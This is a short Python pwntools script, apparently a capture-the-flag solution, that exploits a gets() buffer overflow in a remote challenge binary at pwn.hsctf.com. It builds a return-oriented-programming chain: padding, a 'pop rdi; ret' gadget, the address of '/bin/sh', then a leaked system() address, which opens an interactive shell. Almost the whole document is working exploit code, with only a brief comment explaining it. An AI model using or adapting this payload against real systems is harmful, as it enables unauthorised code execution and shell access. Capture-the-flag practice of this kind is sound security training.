# This is ROP exploit in which we have to find gadget(code which we can use for getting shell). Again in this program we have gets 
# vulnerability so we will reach to eip then we will use the gadget [pop rdi; ret] for our purpose and then we will find the address of 
# system function in ou plt section and we will push this address.


from pwn import *

context.arch='amd64'

sh = remote('pwn.hsctf.com', 3131)

pop_rdi = 0x0000000000401273
bin_sh_addr = 0x402051
system_addr = int(sh.recvline().decode().strip().split(': ')[-1],16)

payload = b'a'*(8+8)
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
#payload += str(flat(bin_sh_addr))

payload += p64(system_addr)

sh.sendlineafter(': ', payload)
sh.interactive()
